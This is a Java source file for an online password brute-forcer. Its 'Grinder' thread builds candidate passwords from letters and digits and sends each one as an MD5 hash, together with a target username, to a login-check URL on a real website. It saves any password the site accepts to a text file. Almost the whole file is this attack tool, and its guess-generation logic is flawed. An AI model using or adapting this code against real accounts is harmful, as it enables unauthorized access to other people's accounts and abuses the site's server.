import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.net.MalformedURLException;
import java.net.URL;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;

import javax.swing.JOptionPane;

public class Grinder implements Runnable{

	private String name;
	ArrayList <String> addStrings = new ArrayList<String>();
	
	
	public Grinder(String na){
		name = na;
		addStrings.add("a");
		addStrings.add("b");
		addStrings.add("c");
		addStrings.add("d");
		addStrings.add("e");
		addStrings.add("f");
		addStrings.add("g");
		addStrings.add("h");
		addStrings.add("i");
		addStrings.add("j");
		addStrings.add("k");
		addStrings.add("l");
		addStrings.add("m");
		addStrings.add("n");
		addStrings.add("o");
		addStrings.add("p");
		addStrings.add("q");
		addStrings.add("r");
		addStrings.add("s");
		addStrings.add("t");
		addStrings.add("u");
		addStrings.add("v");
		addStrings.add("w");
		addStrings.add("x");
		addStrings.add("y");
		addStrings.add("z");
		addStrings.add("A");
		addStrings.add("B");
		addStrings.add("C");
		addStrings.add("D");
		addStrings.add("E");
		addStrings.add("F");
		addStrings.add("G");
		addStrings.add("H");
		addStrings.add("I");
		addStrings.add("J");
		addStrings.add("K");
		addStrings.add("L");
		addStrings.add("M");
		addStrings.add("N");
		addStrings.add("O");
		addStrings.add("P");
		addStrings.add("Q");
		addStrings.add("R");
		addStrings.add("S");
		addStrings.add("T");
		addStrings.add("U");
		addStrings.add("V");
		addStrings.add("W");
		addStrings.add("X");
		addStrings.add("Y");
		addStrings.add("Z");
		addStrings.add("0");
		addStrings.add("1");
		addStrings.add("2");
		addStrings.add("3");
		addStrings.add("4");
		addStrings.add("5");
		addStrings.add("6");
		addStrings.add("7");
		addStrings.add("8");
		addStrings.add("9");
	}
	
	@Override
	public void run() {
		String passWord = "";
		String temp[];
		URL url = null;
		String line = "";
		boolean found = false;
		BufferedReader reader;
		
		
		
		for(int i = 0; i < 20; i ++){
			temp = new String[i];
			for(int j = 0; j < i; j++){
				temp[j] = addStrings.get(0);
			}
			
			for(int j = 0; j < i; j++){
				for(int k = 0; k < addStrings.size(); k++){
					temp[j]=addStrings.get(k);
					for(int l = 0; l < i; l++){
						passWord = passWord+temp[l];
					}
					try {
						url = new URL("http://westonreed.com/picross/checkpass.php?username=" + name + "&password=" + md5(passWord));
						reader = new BufferedReader(new InputStreamReader(url.openStream(), "UTF-8"));
						line = reader.readLine();
					} catch (MalformedURLException e1) {
						// TODO Auto-generated catch block
						e1.printStackTrace();
					} catch (UnsupportedEncodingException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					} catch (IOException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
					
					
					if(line.equals("0")){
						String filename= name +".txt";
					    FileWriter fw;
						try {
							fw = new FileWriter(filename,true);
							BufferedWriter bw = new BufferedWriter(fw);
						    
						    bw.write("password");//appends the string to the file
						    bw.newLine();
						    bw.write(passWord);
						    bw.close();
						} catch (IOException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						} //the true will append the new data
					    
					    found = true;
					}
				
				}
			}
			
			
			
			
		}
			if(!found){
				
			    
			    try {
			    	String filename= name+".txt";
				    FileWriter fw = new FileWriter(filename,true); //the true will append the new data
				    BufferedWriter bw = new BufferedWriter(fw);
					bw.write("could not find password");
					 bw.newLine();
					    bw.write("sorry");
					    bw.close();
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}//appends the string to the file
			   
			}
				
				
				
				
				

			
			
			}
			
			
        
       
		
	



	
	public static String md5(String input) {
        try {
            java.security.MessageDigest md = java.security.MessageDigest.getInstance("MD5");
            byte[] array = md.digest(input.getBytes("UTF-8"));
            StringBuffer sb = new StringBuffer();
            for (int i = 0; i < array.length; i++) {
                sb.append(String.format("%02x", array[i]));
            }
            return sb.toString();
        } catch (NoSuchAlgorithmException | UnsupportedEncodingException e) {
            return null;
        }

    }
	}